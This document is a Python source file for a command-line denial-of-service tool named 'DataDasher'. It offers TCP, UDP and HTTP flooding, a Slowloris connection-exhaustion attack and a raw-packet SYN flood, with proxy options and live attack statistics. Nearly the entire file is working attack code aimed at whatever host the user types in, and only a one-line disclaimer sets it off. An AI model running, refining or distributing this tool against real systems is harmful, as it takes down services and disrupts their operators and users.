import socket
import threading
import time
import requests
import logging
import re
import json
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, track
from rich.table import Table
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.lexers import PygmentsLexer
import argparse
import random
import string
import os
import sys
import struct
from rich.live import Live
from rich.panel import Panel

logging.basicConfig(filename='packet_sender.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')
console = Console()

total_packets_sent = 0
total_packets_failed = 0

# Global variables for visualization
attack_start_time = 0
sent_packets_history = []
failed_packets_history = []
response_times = []


def validate_ip(ip):
    pattern = re.compile(r'^\d{1,3}(\.\d{1,3}){3}$')
    return bool(pattern.match(ip)) and all(0 <= int(octet) <= 255 for octet in ip.split('.'))


def validate_port(port):
    return 1 <= port <= 65535


def display_title():
    console.print(r"""[bold red]
________       _____       ________              ______              
___  __ \_____ __  /______ ___  __ \_____ __________  /______________
__  / / /  __ `/  __/  __ `/_  / / /  __ `/_  ___/_  __ \  _ \_  ___/
_  /_/ // /_/ // /_ / /_/ /_  /_/ // /_/ /_(__  )_  / / /  __/  /    
/_____/ \__,_/ \__/ \__,_/ /_____/ \__,_/ /____/ /_/ /_/\___//_/     

                                                                 [/bold red]""", style="bold yellow")
    console.print("[bold red]DataDasher DDoS tool v1.0.0 - Created by @LifelagCheats[/bold red]\n")
    console.print(
        "[bold red]I am not responsible for any illegal activities, misuse or damage caused by this tool.[/bold red]")
    console.print("[bold red]Type 'help' for help and usage instructions.[/bold red]\n")


def log_packet_action(action):
    logging.info(action)


def send_tcp_packet(server_ip, server_port, payload, custom_headers=None, proxy_server=None, proxy_port=None):
    global total_packets_sent, total_packets_failed, response_times
    try:
        if proxy_server and proxy_port:
            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_socket.connect((proxy_server, proxy_port))
            connect_request = f"CONNECT {server_ip}:{server_port} HTTP/1.1\r\nHost: {server_ip}:{server_port}\r\n\r\n"
            tcp_socket.sendall(connect_request.encode())
            response = tcp_socket.recv(1024).decode()
            if "200 Connection established" not in response:
                raise Exception(f"Proxy connection failed: {response}")
        else:
            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_socket.settimeout(2)
            tcp_socket.connect((server_ip, server_port))

        start_time = time.time()
        if custom_headers:
            for header, value in custom_headers.items():
                tcp_socket.sendall(f"{header}: {value}\r\n".encode())
        tcp_socket.sendall(payload.encode())
        end_time = time.time()
        response_times.append(end_time - start_time)

        log_packet_action(
            f"TCP Packet sent to {server_ip}:{server_port} - Payload: {payload} - Headers: {custom_headers}")
        console.print(f"[green]TCP Packet sent to {server_ip}:{server_port}[/green]")
        total_packets_sent += 1
        tcp_socket.close()
        return True
    except socket.timeout:
        console.print(f"[red]Error: Connection to {server_ip}:{server_port} timed out.[/red]")
        log_packet_action(f"Error: Connection to {server_ip}:{server_port} timed out.")
        total_packets_failed += 1
    except ConnectionRefusedError:
        console.print(f"[red]Error: Connection refused by {server_ip}:{server_port}[/red]")
        log_packet_action(f"Error: Connection refused by {server_ip}:{server_port}")
        total_packets_failed += 1
    except Exception as e:
        console.print(f"[red]Error sending TCP packet: {e}[/red]")
        log_packet_action(f"Error sending TCP packet to {server_ip}:{server_port} - {e}")
        total_packets_failed += 1
    return False


def send_udp_packet(server_ip, server_port, payload, custom_headers=None, proxy_server=None, proxy_port=None):
    global total_packets_sent, total_packets_failed, response_times
    try:
        if proxy_server and proxy_port:
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socket.connect((proxy_server, proxy_port))
            udp_socket.sendto(payload.encode(), (server_ip, server_port))
        else:
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socket.settimeout(2)
            udp_socket.sendto(payload.encode(), (server_ip, server_port))
        log_packet_action(f"UDP Packet sent to {server_ip}:{server_port} - Payload: {payload}")
        console.print(f"[green]UDP Packet sent to {server_ip}:{server_port}[/green]")
        total_packets_sent += 1
        udp_socket.close()
        return True
    except socket.timeout:
        console.print(f"[red]Error: UDP packet timed out. Could not reach {server_ip}:{server_port}[/red]")
        log_packet_action(f"Error: UDP packet timed out. Could not reach {server_ip}:{server_port}")
        total_packets_failed += 1
    except Exception as e:
        console.print(f"[red]Error sending UDP packet: {e}[/red]")
        log_packet_action(f"Error sending UDP packet to {server_ip}:{server_port} - {e}")
        total_packets_failed += 1
    return False


def http_get_request(url, custom_headers=None, proxy_server=None, proxy_port=None):
    global total_packets_sent, total_packets_failed, response_times
    try:
        proxies = None
        if proxy_server and proxy_port:
            proxies = {
                'http': f'http://{proxy_server}:{proxy_port}',
                'https': f'http://{proxy_server}:{proxy_port}'
            }
        start_time = time.time()
        response = requests.get(url, headers=custom_headers, proxies=proxies, timeout=2)
        end_time = time.time()
        response_times.append(end_time - start_time)
        log_packet_action(f"HTTP GET request sent to {url} - Status Code: {response.status_code}")
        console.print(f"[green]HTTP GET request sent to {url} - Status Code: {response.status_code}[/green]")
        total_packets_sent += 1
        return True
    except requests.exceptions.Timeout:
        console.print(f"[red]Error: Timeout - HTTP GET request to {url} timed out.[/red]")
        log_packet_action(f"Error: Timeout - HTTP GET request to {url} timed out.")
        total_packets_failed += 1
    except Exception as e:
        console.print(f"[red]Error sending HTTP GET request: {e}[/red]")
        log_packet_action(f"Error sending HTTP GET request to {url} - {e}")
        total_packets_failed += 1
    return False  # Indicate failure


def statistics_display():
    table = Table(title="Packet Sending Statistics")
    table.add_column("Packets Sent", justify="right", style="green")
    table.add_column("Packets Failed", justify="right", style="red")
    table.add_row(str(total_packets_sent), str(total_packets_failed))
    console.print(table)


def get_custom_headers():
    custom_headers = {}
    while True:
        header_name = Prompt.ask("[bold blue]Enter header name (or leave blank to finish)[/]")
        if not header_name:
            break
        header_value = Prompt.ask(f"[bold blue]Enter value for {header_name}:[/]")
        custom_headers[header_name] = header_value
    return custom_headers


def display_packet_structure(protocol, server_ip, server_port, payload, custom_headers=None):
    console.print("[bold magenta]\nPacket Structure Preview:[/]\n")
    if protocol == "TCP":
        console.print(f"Destination IP: {server_ip}")
        console.print(f"Destination Port: {server_port}")
        if custom_headers:
            console.print("Headers:")
            for name, value in custom_headers.items():
                console.print(f"  {name}: {value}")
        console.print(f"Payload: {payload}\n")


def display_help(command=None):
    if command == 'send':
        console.print("[bold blue]send[/] - Send packets to a target.")
        console.print("Usage: send <protocol> <target> <port> [options]")
        console.print("Options:")
        console.print("  -p, --payload <payload>  Specify the packet payload (default: 'Hello, World!')")
        console.print("  -c, --count <count>    Number of packets to send (default: 1)")
        console.print("  -r, --rate <rate>      Packets per second (default: 1)")
        console.print("  -px, --proxy <proxy>    Specify a proxy server to use (e.g., 127.0.0.1:8080)")
        console.print(
            "  -h, --headers <json>   Custom headers in JSON format (e.g., '{\"header\": \"value\"}')")
    elif command == 'stats':
        console.print("[bold blue]stats[/] - Display packet sending statistics.")
    elif command == 'clear':
        console.print("[bold blue]clear[/] - Clear the screen.")
    elif command == 'help':
        console.print("[bold blue]help[/] - Show this help message.")
    elif command == 'exit':
        console.print("[bold blue]exit[/] - Exit DataDasher.")
    elif command == 'save':
        console.print("[bold blue]save[/] - Save the current config.")
        console.print("Usage: save <config_name>")
    elif command == 'load':
        console.print("[bold blue]load[/] - Load a config file.")
        console.print("Usage: load <config_name>")
    elif command == 'slowloris':
        console.print("[bold blue]slowloris[/] - Initiate a Slowloris attack.")
        console.print(
            "Usage: slowloris <target> <port> [options]"
        )
        console.print("Options:")
        console.print("  -c, --count <count>   Number of connections to establish (default: 500)")
        console.print(
            "  -r, --rate <rate>     Delay in seconds between sending headers (default: 5)"
        )
        console.print(
            "  -t, --timeout <timeout> Timeout in seconds before refreshing connections (default: 60)"
        )
        console.print("  -p, --payload <payload> Specify initial HTTP request (default: GET)")
        console.print("  -px, --proxy <proxy>    Specify a proxy server to use (e.g., 127.0.0.1:8080)")
    elif command == "synflood":
        console.print("[bold blue]synflood[/] - Perform a SYN flood attack.")
        console.print("Usage: synflood <target> <port> [options]")
        console.print("Options:")
        console.print("  -c, --count <count> Number of SYN packets to send (default: 1000)")
        console.print("  -r, --rate <rate> Packets per second to send (default: 100)")
        console.print("  -px, --proxy <proxy>    Specify a proxy server to use (e.g., 127.0.0.1:8080)")
    else:
        console.print("[bold blue]Available commands:[/]")
        console.print("  [bold blue]send[/]     - Send packets to a target.")
        console.print("  [bold blue]stats[/]     - Display packet sending statistics.")
        console.print("  [bold blue]clear[/]     - Clear the screen.")
        console.print("  [bold blue]help[/]     - Show this help message.")
        console.print("  [bold blue]save[/]     - Save the current config.")
        console.print("  [bold blue]load[/]     - Load a config file.")
        console.print("  [bold blue]slowloris[/] - Initiate a Slowloris attack.")
        console.print("  [bold blue]synflood[/]  - Perform a SYN flood attack.")
        console.print("  [bold blue]exit[/]     - Exit DataDasher.")
        console.print("\nType 'help <command>' for more information on a specific command.")


def generate_random_payload(length, charset=string.ascii_letters + string.digits):
    return ''.join(random.choice(charset) for _ in range(length))


def load_payload_from_file(file_path):
    if not os.path.isfile(file_path):
        console.print(f"[red]Error: File not found: {file_path}[/red]")
        return None
    try:
        with open(file_path, 'rb') as f:
            return f.read()
    except Exception as e:
        console.print(f"[red]Error: Could not load file: {e}[/red]")
        return None


def get_target_ip(domain_name):
    try:
        return socket.gethostbyname(domain_name)
    except socket.gaierror:
        console.print(f"[red]Error: Could not resolve domain name: {domain_name}[/red]")
        return None


def save_config(config, file_path):
    try:
        with open(file_path, 'w') as f:
            json.dump(config, f, indent=4)
        console.print(f"[green]Configuration saved to: {file_path}[/green]")
    except Exception as e:
        console.print(f"[red]Error: Could not save configuration: {e}[/red]")


def load_config(file_path):
    if not os.path.isfile(file_path):
        console.print(f"[red]Error: Configuration file not found: {file_path}[/red]")
        return None
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        console.print(f"[red]Error: Could not load configuration: {e}[/red]")
        return None


def slowloris_attack(target_ip, target_port, count=500, rate=5,
                     payload="GET / HTTP/1.1\r\nHost: {target}\r\n\r\n", timeout=60,
                     proxy_server=None, proxy_port=None):
    global total_packets_sent, total_packets_failed, attack_start_time
    sockets = []
    attack_start_time = time.time()

    with Live(update_attack_stats("slowloris", 0), refresh_per_second=4) as live:
        for _ in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if proxy_server and proxy_port:
                    sock.connect((proxy_server, proxy_port))
                    connect_request = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
                    sock.sendall(connect_request.encode())
                    response = sock.recv(1024).decode()
                    if "200 Connection established" not in response:
                        raise Exception(f"Proxy connection failed: {response}")
                else:
                    sock.connect((target_ip, target_port))
                payload = payload.format(target=target_ip)
                sock.sendall(payload.encode())
                sockets.append(sock)
                total_packets_sent += 1
                time.sleep(1 / rate)

                elapsed_time = time.time() - attack_start_time
                live.update(update_attack_stats("slowloris", elapsed_time))

            except Exception as e:
                console.print(f"[red]Error opening Slowloris connection: {e}[/red]")
                total_packets_failed += 1

        console.print(f"[yellow]Opened {len(sockets)} Slowloris connections.[/yellow]")
        console.print("[yellow]Keeping connections open... (Press Ctrl+C to interrupt)[/yellow]")

        start_time = time.time()

        try:
            while True:
                if time.time() - start_time > timeout:
                    start_time = time.time()
                    console.print("[yellow]Closing inactive connections and opening new ones.[/yellow]")
                    for sock in sockets:
                        try:
                            sock.close()
                        except Exception as e:
                            console.print(f"[red]Error closing connection: {e}[/red]")
                    sockets = []
                    for _ in range(count):
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            if proxy_server and proxy_port:
                                sock.connect((proxy_server, proxy_port))
                                connect_request = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
                                sock.sendall(connect_request.encode())
                                response = sock.recv(1024).decode()
                                if "200 Connection established" not in response:
                                    raise Exception(f"Proxy connection failed: {response}")
                            else:
                                sock.connect((target_ip, target_port))
                            payload = payload.format(target=target_ip)
                            sock.sendall(payload.encode())
                            sockets.append(sock)
                            total_packets_sent += 1
                            time.sleep(1 / rate)
                        except Exception as e:
                            console.print(f"[red]Error opening Slowloris connection: {e}[/red]")
                            total_packets_failed += 1
                for sock in sockets:
                    try:
                        for _ in range(random.randint(1, 5)):
                            sock.sendall(
                                f"X-{random.choice(string.ascii_letters)}: {random.randint(1, 5000)}\r\n".encode())
                            total_packets_sent += 1

                        elapsed_time = time.time() - attack_start_time
                        live.update(update_attack_stats("slowloris", elapsed_time))
                        time.sleep(rate)
                    except Exception as e:
                        console.print(f"[red]Error sending data to keep connection alive: {e}[/red]")
                        total_packets_failed += 1

        except KeyboardInterrupt:
            console.print("\n[yellow]Interrupting Slowloris attack. Closing connections.[/yellow]")
            for sock in sockets:
                sock.close()


def syn_flood_attack(target_ip, target_port, count=1000, rate=100, proxy_server=None, proxy_port=None):
    global total_packets_sent, total_packets_failed, attack_start_time
    console.print(f"[red]WARNING: Performing SYN Flood attack!  Use extreme caution![/red]")
    attack_start_time = time.time()

    with Live(update_attack_stats("synflood", 0), refresh_per_second=4) as live:
        for i in range(count):
            try:
                ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 0, 0, 0, 0x40, 0, 0,
                                        socket.inet_aton(socket.gethostbyname(socket.gethostname())),
                                        socket.inet_aton(target_ip))
                tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), target_port, 0, 0, 0x02,
                                         0, 0, 0, 0)
                source_ip = socket.inet_aton(socket.gethostbyname(socket.gethostname()))
                pseudo_header = source_ip + socket.inet_aton(target_ip) + b"\x00" + b"\x06" + struct.pack("!H",
                                                                                                          len(tcp_header))
                packet = ip_header + tcp_header
                if proxy_server and proxy_port:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    s.sendto(packet, (proxy_server, proxy_port))
                    s.close()
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    s.sendto(packet, (target_ip, target_port))
                    s.close()
                total_packets_sent += 1

                if i % 10 == 0:
                    elapsed_time = time.time() - attack_start_time
                    live.update(update_attack_stats("synflood", elapsed_time))

                time.sleep(1 / rate)
            except Exception as e:
                console.print(f"[red]Error sending SYN packet: {e}[/red]")
                total_packets_failed += 1
                break


def is_target_responsive(target_ip, target_port, protocol="TCP", retries=3, delay=1):
    """Check if the target is responsive, with retries and delay."""
    for attempt in range(retries):
        try:
            if protocol == "TCP":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                sock.close()
            elif protocol == "UDP":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                sock.sendto(b"test", (target_ip, target_port))
                sock.close()
            elif protocol == "HTTP GET":
                response = requests.get(f"http://{target_ip}:{target_port}/", timeout=2)
                if response.status_code == 200:
                    return True
            return True  # If connection or request succeeded
        except (socket.timeout, ConnectionRefusedError, requests.exceptions.RequestException) as e:
            console.print(f"[yellow]Attempt {attempt + 1}/{retries}: Target not responsive: {e}[/yellow]")
            time.sleep(delay)
    return False


def update_attack_stats(attack_type, elapsed_time):
    """Update the attack statistics tables and graphs."""
    global sent_packets_history, failed_packets_history, attack_start_time
    if attack_type == 'send':
        sent_packets_history.append(total_packets_sent)
        failed_packets_history.append(total_packets_failed)
        table = Table(title=f"Attack Statistics (Elapsed Time: {elapsed_time:.2f} seconds)", expand=True)
        table.add_column("Packets Sent", style="green", no_wrap=True)
        table.add_column("Packets Failed", style="red", no_wrap=True)
        table.add_row(str(total_packets_sent), str(total_packets_failed))
    elif attack_type == 'slowloris':
        sent_packets_history.append(total_packets_sent - sum(sent_packets_history))
        failed_packets_history.append(
            total_packets_failed - sum(failed_packets_history))
        table = Table(title=f"Slowloris Statistics (Elapsed Time: {elapsed_time:.2f} seconds)", expand=True)
        table.add_column("Active Connections", style="cyan", no_wrap=True)
        table.add_column("Packets Sent (Interval)", style="green", no_wrap=True)
        table.add_column("Packets Failed (Interval)", style="red", no_wrap=True)
        table.add_row(str(len(socket)), str(sent_packets_history[-1]), str(failed_packets_history[-1]))

    elif attack_type == 'synflood':
        sent_packets_history.append(total_packets_sent)
        failed_packets_history.append(total_packets_failed)
        table = Table(title=f"SYN Flood Statistics (Elapsed Time: {elapsed_time:.2f} seconds)", expand=True)
        table.add_column("Packets Sent", style="green", no_wrap=True)
        table.add_column("Packets Failed", style="red", no_wrap=True)
        table.add_row(str(total_packets_sent), str(total_packets_failed))
    return table


def attack_visualizations(elapsed_time):
    """Display tables and graphs for attack statistics."""
    global sent_packets_history, failed_packets_history, response_times
    grid = Table.grid(expand=True)
    grid.add_column(justify="center", ratio=1)
    grid.add_column(justify="right", ratio=2)
    if response_times:
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        response_time_panel = Panel(
            f"Average Response Time: {avg_response_time:.2f} seconds",
            title="Response Time",
            expand=False,
        )
        grid.add_row(response_time_panel)
    console.print(grid)


def main():
    global total_packets_sent, total_packets_failed, attack_start_time
    display_title()
    session = PromptSession(
        history=FileHistory('packet_sender_history.txt'),
        completer=WordCompleter(
            ['send', 'stats', 'clear', 'help', 'save', 'load', 'slowloris', 'synflood', 'exit'],
            ignore_case=True),
    )
    while True:
        try:
            command = session.prompt('> ')
            if command:
                args = command.split()
                cmd = args[0].lower()
                if cmd == 'send':
                    if len(args) < 4:
                        console.print("[red]Error: Invalid usage. Type 'help send' for correct usage.[/red]")
                        continue

                    protocol = args[1].upper()
                    target = args[2]

                    try:
                        port = int(args[3])
                    except ValueError:
                        console.print("[red]Error: Invalid port number.[/red]")
                        continue

                    payload = 'Hello, World!'
                    count = 1
                    rate = 1
                    custom_headers = {}
                    proxy_server = None
                    proxy_port = None

                    i = 4
                    while i < len(args):
                        if args[i] in ('-p', '--payload') and i < len(args) - 1:
                            payload = args[i + 1]
                            i += 2
                        elif args[i] in ('-c', '--count') and i < len(args) - 1:
                            try:
                                count = int(args[i + 1])
                            except ValueError:
                                console.print("[red]Error: Invalid count value.[/red]")
                                break
                            i += 2
                        elif args[i] in ('-r', '--rate') and i < len(args) - 1:
                            try:
                                rate = int(args[i + 1])
                            except ValueError:
                                console.print("[red]Error: Invalid rate value.[/red]")
                                break
                            i += 2
                        elif args[i] in ('-hd', '--headers') and i < len(args) - 1:
                            try:
                                custom_headers = json.loads(args[i + 1])
                            except json.JSONDecodeError:
                                console.print("[red]Error: Invalid JSON format for headers.[/red]")
                                break
                            i += 2
                        elif args[i] in ('-px', '--proxy') and i < len(args) - 1:
                            try:
                                proxy_server, proxy_port = args[i + 1].split(":")
                                proxy_port = int(proxy_port)
                                i += 2
                            except Exception as e:
                                console.print(f"[red]Error parsing proxy: {e}[/red]")
                                break
                        else:
                            console.print(f"[red]Error: Unknown option '{args[i]}'.[/red]")
                            break

                    if protocol in ("TCP", "UDP", "HTTP GET"):
                        if not validate_ip(target):
                            target_ip = get_target_ip(target)
                            if target_ip is None:
                                continue
                            target = target_ip

                        attack_start_time = time.time()
                        with Live(update_attack_stats("send", 0), refresh_per_second=4) as live:
                            # Target validation before the attack, with retries
                            if is_target_responsive(target, port, protocol):
                                console.print(f"[green]Target {target}:{port} is responsive.[/green]")
                                for i in range(count):
                                    if protocol == "TCP":
                                        if not send_tcp_packet(target, port, payload, custom_headers,
                                                               proxy_server=proxy_server, proxy_port=proxy_port):
                                            break
                                    elif protocol == "UDP":
                                        if not send_udp_packet(target, port, payload, custom_headers,
                                                               proxy_server=proxy_server, proxy_port=proxy_port):
                                            break
                                    elif protocol == "HTTP GET":
                                        if not http_get_request(target, custom_headers, proxy_server=proxy_server,
                                                                proxy_port=proxy_port):
                                            break
                                    elapsed_time = time.time() - attack_start_time
                                    if i % 10 == 0 or i == count - 1:  # Update Live display more frequently
                                        live.update(update_attack_stats("send", elapsed_time))
                                    time.sleep(1 / rate)
                                attack_visualizations(elapsed_time)
                            else:
                                console.print(f"[red]Target {target}:{port} is not responsive. Attack aborted.[/red]")
                    else:
                        console.print(
                            f"[red]Error: Invalid protocol '{protocol}'. Choose from TCP, UDP, or HTTP GET.[/red]"
                        )
                elif cmd == 'stats':
                    statistics_display()
                elif cmd == 'clear':
                    console.clear()
                    display_title()
                elif cmd == 'help':
                    if len(args) > 1:
                        display_help(args[1].lower())
                    else:
                        display_help()
                elif cmd == 'save':
                    if len(args) < 2:
                        console.print("[red]Error: Provide a file path to save the configuration.[/red]")
                        continue
                    config_file = args[1]
                    config = {
                        "default_protocol": protocol,
                        "default_target": target,
                        "default_port": port
                    }
                    save_config(config, config_file)
                elif cmd == 'load':
                    if len(args) < 2:
                        console.print("[red]Error: Provide a file path to load the configuration.[/red]")
                        continue
                    config_file = args[1]
                    config = load_config(config_file)
                    if config is None:
                        continue
                elif cmd == 'slowloris':
                    if len(args) < 3:
                        console.print(
                            "[red]Error: Invalid usage. Type 'help slowloris' for correct usage.[/red]")
                        continue
                    target = args[1]
                    try:
                        port = int(args[2])
                    except ValueError:
                        console.print("[red]Error: Invalid port number.[/red]")
                        continue
                    count = 500
                    rate = 5
                    timeout = 60
                    payload = "GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
                    proxy_server = None
                    proxy_port = None
                    i = 3
                    while i < len (args):
                        if args[i] in ("-c", "--count") and i < len(args) - 1:
                            try:
                                count = int(args[i + 1])
                            except ValueError:
                                console.print("[red]Error: Invalid count value.[/red]")
                                break
                            i += 2
                        elif args[i] in ("-r", "--rate") and i < len(args) - 1:
                            try:
                                rate = int(args[i + 1])
                            except ValueError:
                                console.print("[red]Error: Invalid rate value.[/red]")
                                break
                            i += 2
                        elif args[i] in ("-t", "--timeout") and i < len(args) - 1:
                            try:
                                timeout = int(args[i + 1])
                            except ValueError:
                                console.print("[red]Error: Invalid timeout value.[/red]")
                                break
                            i += 2
                        elif args[i] in ("-p", "--payload") and i < len(args) - 1:
                            payload = args[i + 1]
                            i += 2
                        elif args[i] in ('-px', '--proxy') and i < len(args) - 1:
                            try:
                                proxy_server, proxy_port = args[i + 1].split(":")
                                proxy_port = int(proxy_port)
                                i += 2
                            except Exception as e:
                                console.print(f"[red]Error parsing proxy: {e}[/red]")
                                break
                        else:
                            console.print(f"[red]Error: Unknown option '{args[i]}' for slowloris.[/red]")
                            break

                    if not validate_ip(target):
                        target_ip = get_target_ip(target)
                        if target_ip is None:
                            continue
                        target = target_ip

                    slowloris_attack(target, port, count, rate, payload, timeout, proxy_server, proxy_port)
                elif cmd == 'synflood':
                    if len(args) < 3:
                        console.print(
                            "[red]Error: Invalid usage. Type 'help synflood' for correct usage.[/red]")
                        continue
                    target = args[1]
                    try:
                        port = int(args[2])
                    except ValueError:
                        console.print("[red]Error: Invalid port number.[/red]")
                        continue

                    count = 1000
                    rate = 100
                    proxy_server = None
                    proxy_port = None

                    i = 3
                    while i < len(args):
                        if args[i] in ("-c", "--count") and i < len(args) - 1:
                            try:
                                count = int(args[i + 1])
                            except ValueError:
                                console.print("[red]Error: Invalid count value.[/red]")
                                break
                            i += 2
                        elif args[i] in ("-r", "--rate") and i < len(args) - 1:
                            try:
                                rate = int(args[i + 1])
                            except ValueError:
                                console.print("[red]Error: Invalid rate value.[/red]")
                                break
                            i += 2
                        elif args[i] in ('-px', '--proxy') and i < len(args) - 1:
                            try:
                                proxy_server, proxy_port = args[i + 1].split(":")
                                proxy_port = int(proxy_port)
                                i += 2
                            except Exception as e:
                                console.print(f"[red]Error parsing proxy: {e}[/red]")
                                break
                        else:
                            console.print(f"[red]Error: Unknown option '{args[i]}' for synflood.[/red]")
                            break

                    if not validate_ip(target):
                        target_ip = get_target_ip(target)
                        if target_ip is None:
                            continue
                        target = target_ip

                    syn_flood_attack(target, port, count, rate, proxy_server, proxy_port)
                elif cmd == 'exit':
                    if Confirm.ask("Are you sure you want to exit?"):
                        console.print("[bold green]Exiting DataDasher. Goodbye![/]")
                        break
                else:
                    console.print(
                        f"[red]Error: Unknown command '{cmd}'. Type 'help' for available commands.[/red]")
            else:
                pass
        except KeyboardInterrupt:
            console.print("\n[yellow]Interrupted![/]")
        except EOFError:
            console.print("\n[yellow]Exiting...[/]")
            break
        except Exception as e:
            console.print(f"[bold red]Fatal Error: {e}[/]")
            sys.exit(1)

if __name__ == "__main__":
    main()
